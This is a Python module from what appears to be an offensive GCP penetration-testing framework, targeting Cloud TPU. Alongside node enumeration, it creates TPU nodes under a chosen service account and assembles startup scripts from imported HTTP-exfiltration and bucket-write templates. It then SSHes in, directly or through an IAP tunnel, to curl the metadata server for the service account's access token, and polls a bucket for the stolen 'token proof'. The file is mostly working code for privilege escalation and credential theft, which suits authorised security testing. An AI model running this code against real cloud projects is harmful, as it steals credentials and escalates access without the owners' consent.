from __future__ import annotations

import io
import json
import subprocess
import time
from typing import Any

from google.cloud import tpu_v2  # type: ignore
from googleapiclient.discovery import build as discovery_build
from googleapiclient.http import MediaIoBaseDownload

from gcpwn.core.resource import GcpListResource
from gcpwn.core.utils.module_helpers import (
    extract_path_tail,
    region_resolver_for,
)
from gcpwn.core.utils.serialization import resource_to_dict

resolve_locations = region_resolver_for("tpu")

_METADATA_URL = (
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "service-accounts/default/token"
)

_GCS_PROOF_PATH = "gcpwn-tpu-pe/tpu-token-proof.json"

from gcpwn.modules.gcp.tpu.utilities.exploit_payloads import (  # noqa: E402
    STARTUP_TMPL as _STARTUP_TMPL,
    EXFIL_BLOCK as _EXFIL_BLOCK,
    GCS_BLOCK as _GCS_BLOCK,
)


class TpuNodesResource(GcpListResource):
    """List Cloud TPU v2 nodes.

    TPU nodes run as a service account accessible via the GCE metadata server;
    nodes with non-default SAs are code-exec-as-SA primitives.
    """

    SERVICE_LABEL = "Cloud TPU"
    TABLE_NAME = "tpu_nodes"
    COLUMNS = ["location", "node_id", "name", "state", "service_account",
               "accelerator_type", "tensorflow_version", "metadata"]
    ACTION_RESOURCE_TYPE = "nodes"
    LIST_PERMISSION = "tpu.nodes.list"
    GET_PERMISSION = "tpu.nodes.get"
    ID_FIELD = "node_id"
    LIST_METHOD = "list_nodes"
    GET_METHOD = "get_node"
    PARENT_FROM_PROJECT_LOCATION = True

    def _build_client(self, session):
        return tpu_v2.TpuClient(credentials=session.credentials)

    def _extra_save_fields(self, raw: dict[str, Any]) -> dict[str, Any]:
        sa = raw.get("service_account") or {}
        sa_email = sa.get("email", "") if isinstance(sa, dict) else str(sa or "")
        meta = raw.get("metadata") or {}
        return {
            "node_id": extract_path_tail(str(raw.get("name", "") or "")),
            "state": str(raw.get("state", "") or ""),
            "service_account": str(sa_email or ""),
            "accelerator_type": str(raw.get("accelerator_type", "") or ""),
            "tensorflow_version": str(raw.get("runtime_version", "") or ""),
            "metadata": json.dumps(meta) if meta else "",
        }

    # ── Exploit helpers ────────────────────────────────────────────────────────

    def create(self, parent: str, node_id: str, node: Any, timeout: int = 600) -> dict:
        """Create a TPU node and wait for the LRO to complete.

        Blocks for up to `timeout` seconds. Returns the resulting node as a dict.
        """
        operation = self.client.create_node(
            parent=parent,
            node_id=node_id,
            node=node,
        )
        result = operation.result(timeout=timeout)
        return resource_to_dict(result)

    def delete(self, name: str) -> None:
        """Request node deletion (best-effort; swallows errors)."""
        try:
            self.client.delete_node(name=name)
        except Exception:
            pass

    def get_node(self, name: str) -> dict:
        """Fetch a single node by full resource name."""
        return resource_to_dict(self.client.get_node(name=name))


# ── Startup-script builder ─────────────────────────────────────────────────────

def download_startup_scripts(session, nodes: list[dict]) -> None:
    """Download startup-script metadata from TPU node rows to disk."""
    from gcpwn.core.output_paths import resolve_download_path
    from gcpwn.core.utils.service_runtime import DownloadBudget
    budget = DownloadBudget(session, label="TPU startup scripts")
    project_id = session.project_id or ""
    downloaded = 0
    for node in nodes:
        if budget.exceeded():
            break
        name = node.get("name", "")
        node_id = name.split("/")[-1] if "/" in name else name
        location = node.get("location", "")
        metadata = node.get("metadata") or {}
        if isinstance(metadata, str):
            try:
                metadata = json.loads(metadata)
            except Exception:
                metadata = {}
        script = (metadata.get("startup-script") or "").strip()
        if not script:
            continue
        path = resolve_download_path(
            session, service_name="tpu", project_id=project_id,
            subdirs=[location], filename=f"{node_id}_startup_script.sh",
        )
        path.write_text(script, encoding="utf-8")
        print(f"[+] Wrote TPU startup script → {path}")
        downloaded += 1
    if downloaded:
        print(f"[*] Downloaded {downloaded} TPU startup script(s).")
    else:
        print("[*] No startup-script metadata found on enumerated TPU nodes.")


def build_startup_script(exfil_url: str | None, output_bucket: str | None) -> str:
    exfil_block = (
        _EXFIL_BLOCK.format(exfil_url=exfil_url)
        if exfil_url
        else "# --exfil-url not set; skipping HTTP exfil"
    )
    gcs_block = (
        _GCS_BLOCK.format(bucket=output_bucket, path=_GCS_PROOF_PATH)
        if output_bucket
        else "# --output-bucket not set; skipping GCS write"
    )
    return _STARTUP_TMPL.format(exfil_block=exfil_block, gcs_block=gcs_block)


def extract_external_ip(node: dict) -> str | None:
    """Extract the first external IP from a node's networkEndpoints."""
    for ep in node.get("network_endpoints", []) or []:
        acc = ep.get("access_config", {}) or {}
        ip = acc.get("external_ip") or ep.get("ip_address")
        if ip:
            return ip
    return None


def ssh_query_metadata(project_id: str, zone: str, node_id: str) -> str | None:
    """Use gcloud compute tpus tpu-vm ssh to query the metadata server.

    Tries direct SSH first, then falls back to IAP tunnel (--tunnel-through-iap
    via gcloud alpha) which works even when direct port-22 access is blocked.
    Returns the raw JSON token string on success, None on failure.
    """
    metadata_cmd = f"curl -sf -H 'Metadata-Flavor: Google' {_METADATA_URL}"
    base_flags = [
        f"--zone={zone}",
        f"--project={project_id}",
        "--command", metadata_cmd,
    ]

    attempts = [
        # Try direct SSH via gcloud stable first
        ["gcloud", "compute", "tpus", "tpu-vm", "ssh", node_id] + base_flags,
        # Fall back to IAP tunnel via gcloud alpha (works when port 22 is blocked)
        ["gcloud", "alpha", "compute", "tpus", "tpu-vm", "ssh", node_id,
         "--tunnel-through-iap"] + base_flags,
    ]

    for cmd in attempts:
        label = "iap" if "--tunnel-through-iap" in cmd else "direct"
        print(f"  [ssh/{label}] Running: {' '.join(cmd)}")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            stdout = result.stdout.strip()
            stderr = result.stderr.strip()
            if result.returncode == 0 and stdout:
                # Filter out gcloud warning lines to get just the JSON
                lines = [l for l in stdout.splitlines()
                         if not l.startswith("WARNING:") and not l.startswith("SSH:")]
                clean = "\n".join(lines).strip()
                if clean:
                    return clean
            if result.returncode != 0 and stderr:
                print(f"  [ssh/{label}] stderr: {stderr[:300]}")
        except subprocess.TimeoutExpired:
            print(f"  [ssh/{label}] timed out after 60s")
        except FileNotFoundError:
            print(f"  [ssh/{label}] gcloud not found in PATH; skipping")
            break
        except Exception as exc:
            print(f"  [ssh/{label}] error: {exc}")
    return None


def poll_gcs_proof(session, bucket: str, timeout: int = 180) -> str | None:
    """Poll gs://BUCKET/GCS_PROOF_PATH until the startup script writes it.

    Returns the raw content string on success, None on timeout.
    """
    print(f"  [gcs] Polling gs://{bucket}/{_GCS_PROOF_PATH} (up to {timeout}s)...")
    try:
        storage = discovery_build(
            "storage", "v1",
            credentials=session.credentials,
            cache_discovery=False,
        )
    except Exception as exc:
        print(f"  [gcs] Failed to build storage client: {exc}")
        return None

    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(15)
        try:
            req = storage.objects().get_media(bucket=bucket, object=_GCS_PROOF_PATH)
            buf = io.BytesIO()
            dl = MediaIoBaseDownload(buf, req)
            done = False
            while not done:
                _, done = dl.next_chunk()
            content = buf.getvalue().decode("utf-8", errors="replace")
            if content:
                print("  [gcs] Proof file found!")
                return content
        except Exception:
            pass
    print("  [gcs] Timed out waiting for proof file.")
    return None


def parse_token(raw: str) -> str | None:
    """Extract access_token from JSON or return raw string if it looks like a token."""
    try:
        obj = json.loads(raw)
        return obj.get("access_token", raw)
    except (json.JSONDecodeError, ValueError):
        stripped = raw.strip()
        return stripped if stripped else None
